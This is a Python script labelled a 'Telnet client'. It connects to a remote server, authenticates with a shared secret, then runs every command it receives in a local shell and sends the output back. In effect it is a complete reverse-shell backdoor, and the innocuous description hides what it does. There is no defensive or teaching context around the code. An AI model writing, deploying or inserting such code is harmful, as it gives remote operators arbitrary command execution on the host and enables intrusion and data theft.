import argparse
import asyncio
import telnetlib3

async def shell(reader, writer, secret=""):
    while True:
        # Read command from the server
        command = await reader.read(1024)
        if not command:
            # End of File
            break

        # Respond to authentication challenge
        if command.strip() == "AUTH":
            writer.write(secret + "\n")
            await writer.drain()
            continue

        # Execute the command using asyncio.create_subprocess_shell
        process = await asyncio.create_subprocess_shell(command,
                                                        stdout=asyncio.subprocess.PIPE,
                                                        stderr=asyncio.subprocess.PIPE)
        output, error = await process.communicate()
        print(f"Receive command: {command}")

        # Check if output is empty
        if not output:
            result = b"ok"
        else:
            result = output

        # Send the result back to the server
        writer.write(result.decode())

        # Flush the writer to ensure data is sent immediately
        await writer.drain()

def main(server_ip, port, secret):
    loop = asyncio.get_event_loop()
    coro = telnetlib3.open_connection(server_ip, port, shell=lambda r, w: shell(r, w, secret))
    reader, writer = loop.run_until_complete(coro)
    loop.run_until_complete(writer.protocol.waiter_closed)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Telnet client")
    parser.add_argument("server_ip", help="IP address of the server")
    parser.add_argument("--port", type=int, default=23, help="Port number (default: 23)")
    parser.add_argument("--secret", required=True, help="Shared secret for server authentication")
    args = parser.parse_args()

    main(args.server_ip, args.port, args.secret)
